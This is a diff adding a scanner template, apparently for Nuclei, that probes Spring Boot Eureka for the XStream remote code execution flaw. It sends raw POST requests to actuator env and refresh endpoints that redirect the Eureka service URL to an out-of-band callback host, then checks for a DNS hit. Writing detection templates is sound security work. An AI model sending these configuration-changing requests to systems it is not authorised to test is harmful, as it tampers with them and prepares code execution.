@@ -1,0 +1,87 @@
+id: springboot-eureka-xstream-rce
+info:
+  name: springboot-eureka-xstream-rce
+  author: Administrator
+  severity: critical
+  description: description
+  reference:
+    - https://www.hacking8.com/bug-product/Spring-Boot/Spring-Boot-eureka-xstream-deserialization-rce.html
+    - https://github.com/LandGrey/SpringBootVulExploit
+  tags: misconfig,springboot,env,exposure
+
+http:
+  - raw:
+      - |-
+        POST /actuator/env HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Content-Type: application/json
+        Accept-Encoding: gzip, deflate
+        Upgrade-Insecure-Requests: 1
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: none
+        Sec-Fetch-User: ?1
+        Te: trailers
+        Content-Length: 83
+
+        {"name":"eureka.client.serviceUrl.defaultZone","value":"http://{{interactsh-url}}"}
+      - |+
+        POST /actuator/refresh HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Content-Type: application/json
+        Accept-Encoding: gzip, deflate
+        Upgrade-Insecure-Requests: 1
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: none
+        Sec-Fetch-User: ?1
+        Te: trailers
+        Content-Length: 0
+
+
+
+      - |-
+        POST /env HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate
+        Upgrade-Insecure-Requests: 1
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: none
+        Sec-Fetch-User: ?1
+        Te: trailers
+        Content-Length: 63
+
+        eureka.client.serviceUrl.defaultZone=http://{{interactsh-url}}
+      - |+
+        POST /refresh HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate
+        Upgrade-Insecure-Requests: 1
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: none
+        Sec-Fetch-User: ?1
+        Te: trailers
+        Content-Length: 0
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
